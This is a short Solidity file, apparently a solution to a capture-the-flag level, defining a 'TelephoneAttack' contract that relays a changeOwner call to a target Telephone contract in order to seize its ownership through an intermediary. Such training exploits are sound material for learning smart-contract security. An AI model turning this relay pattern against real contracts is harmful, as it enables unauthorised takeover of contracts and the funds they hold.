// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone private immutable _telephone;

    constructor(address telephoneAddress) {
        _telephone = Telephone(telephoneAddress);
    }

    function changeTelephoneOwner(address _owner) public {
        _telephone.changeOwner(_owner);
    }
}
